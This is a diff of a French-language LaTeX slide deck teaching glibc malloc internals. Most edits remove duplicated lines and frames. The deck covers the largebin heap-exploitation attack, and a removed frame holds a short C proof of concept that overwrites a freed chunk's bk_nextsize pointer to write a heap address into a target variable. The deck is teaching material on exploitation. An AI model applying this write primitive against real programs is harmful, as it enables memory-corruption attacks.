@@ -73,33 +73,9 @@
         numbersep=5pt,
         xleftmargin=0.7em
     },
-    minted options={
-        fontsize=\scriptsize,
-        breaklines,
-        breakanywhere,
-        autogobble,
-        escapeinside=@@,
-        linenos,
-        numbersep=5pt,
-        xleftmargin=0.7em
-    },
-    minted options={
-        fontsize=\scriptsize,
-        breaklines,
-        breakanywhere,
-        autogobble,
-        escapeinside=@@,
-        linenos,
-        numbersep=5pt,
-        xleftmargin=0.7em
-    },
     colback=white,
     colframe=black,
-    colframe=black,
-    colframe=black,
     boxrule=1pt,
-    arc=0pt,
-    arc=0pt,
     arc=0pt,
     left=6pt, right=4pt, top=4pt, bottom=4pt,
     drop shadow=black!30!white,
@@ -189,7 +165,6 @@
 
 
 \begin{frame}{C'est quoi malloc(1 /3)}
-\begin{frame}{C'est quoi malloc(1 /3)}
 
     \begin{center}
         \begin{tikzpicture}[
@@ -271,7 +246,6 @@
 
 \end{frame}
 
-\begin{frame}{C'est quoi malloc(3 /3)}
 \begin{frame}{C'est quoi malloc(3 /3)}
 
     \begin{minipage}{0.40\textwidth}
@@ -538,15 +512,12 @@
         \begin{itemize}
             \item Liste \textbf{doublement chaînée FIFO}
             \item Tailles : \texttt{0x400} → \texttt{limite mmap (128ko)}
-            \item Tailles : \texttt{0x400} → \texttt{limite mmap (128ko)}
-            \item Tailles : \texttt{0x400} → \texttt{limite mmap (128ko)}
         \end{itemize}
 
     \end{minipage}
 
 \end{frame}
 
-\begin{frame}{Exemple largebins}
 \begin{frame}{Exemple largebins}
 
     \begin{tikzpicture}[
@@ -865,33 +836,9 @@
                 return 0;
             }
     \end{ccode}
-\begin{frame}[fragile]{Largebin attack(1 /3)}
-    \begin{ccode}
-        int main(){
-                /* Disable IO buffering to prevent stream from interfering with heap */
-                /* Disable IO buffering to prevent stream from interfering with heap */
-                setvbuf(stdin, NULL, _IONBF, 0);
-                setvbuf(stdout, NULL, _IONBF, 0);
-                setvbuf(stderr, NULL, _IONBF, 0);
+    \end{frame}
 
-                size_t target = 0;
-                size_t *p1 = malloc(0x428), *g1 = malloc(0x18);
-                size_t *p2 = malloc(0x418), *g2 = malloc(0x18);
 
-                free(p1);
-                size_t *g3 = malloc(0x438);
-                free(p2);
-
-                p1[3] = (size_t)((&target) - 4); /* Overwrite metadata pointer */
-                p1[3] = (size_t)((&target) - 4); /* Overwrite metadata pointer */
-                size_t *g4 = malloc(0x438);
-                assert((size_t)(p2 - 2) == target);
-                return 0;
-            }
-    \end{ccode}
-\end{frame}
-
-\begin{frame}[fragile]{Largebin attack(2 /3)}
 \begin{frame}[fragile]{Largebin attack(2 /3)}
     \begin{ccode}
         int main(){
@@ -968,7 +915,6 @@
 \end{frame}
 
 
-\begin{frame}[fragile]{Largebin attack(3 /3)}
 \begin{frame}[fragile]{Largebin attack(3 /3)}
     \begin{ccode}
         int main()
@@ -1039,7 +985,6 @@
         \visible<2>{
             \draw[nextarrow] (p1.north) -- (target.south)
             node[midway, right]{overwrite fd\_nextsize};
-            node[midway, right]{overwrite fd\_nextsize};
         }
 
         % ===========================
@@ -1084,79 +1029,6 @@
 
 
 
-\begin{frame}[fragile]{Largebin attack(2 /3)}
-    \begin{ccode}
-        int main(){
-                size_t *p1 = malloc(0x428), *g1 = malloc(0x18);
-                size_t *p2 = malloc(0x418), *g2 = malloc(0x18);
-
-                free(p1);
-                size_t *g3 = malloc(0x438);
-                free(p2);
-
-            }
-    \end{ccode}
-
-    \begin{tikzpicture}[
-        bin/.style={
-                rectangle, draw=black, thick,
-                minimum width=3.2cm,
-                minimum height=1cm,
-                align=center
-            },
-        chunk/.style={
-                rectangle, draw=black, thick,
-                minimum width=2.6cm,
-                minimum height=7mm,
-                align=center
-            },
-        fdarrow/.style={-{Latex[length=3mm]}, thick, blue},
-        nextarrow/.style={-{Latex[length=3mm]}, thick, dashed, red},
-        prevarrow/.style={-{Latex[length=3mm]}, thick, dashed, orange},
-        every node/.style={font=\small}
-        ]
-
-        % Bins
-        \visible<2-3>{\node[bin] (bin64) at (0,0) {Largebin 64\\0x400–0x4FF};}
-        \visible<1,3>{\node[bin, below=1.2cm of bin64] (unsorted) {Unsortedbin};}
-
-        % état intermédiare 1
-        \visible<1>{\node[chunk, right=1cm of unsorted] (p1) {p1 : 0x428};}
-        \visible<1>{\node[chunk, right=1cm of p1] (arena) {Arena};}
-
-        \visible<1>{\draw[fdarrow] (p1.east) -- (arena.west);}
-
-
-        % état intermédiare 2
-        \visible<2>{
-            \node[chunk, right=1cm of bin64] (p1) {p1 : 0x428};
-        }
-
-        % fd_nextsize : boucle à droite
-        \visible<2->{
-            \draw[nextarrow] (p1.east)
-            .. controls +(0.8,0.6) and +(0.8,-0.6)
-            .. (p1.east);
-        }
-
-        % bk_nextsize : boucle à gauche
-        \visible<2->{
-            \draw[prevarrow] (p1.west)
-            .. controls +(-0.8,0.6) and +(-0.8,-0.6)
-            .. (p1.west);
-        }
-
-
-        % état final
-        \visible<3>{\node[chunk, right=1cm of bin64] (p1) {p1 : 0x428};}
-        \visible<3>{\node[chunk, right=1cm of unsorted] (p2) {p2 : 0x418};}
-        \visible<3>{\node[chunk, right=1cm of p2] (arena) {Arena};}
-
-        \visible<3>{\draw[fdarrow] (p2.east) -- (arena.west);}
-
-    \end{tikzpicture}
-
-\end{frame}
 
 \begin{frame}{Évolutions : GLIBC 2.42 \& 2.43}
     \textbf{GLIBC 2.42 (Août 2025)}
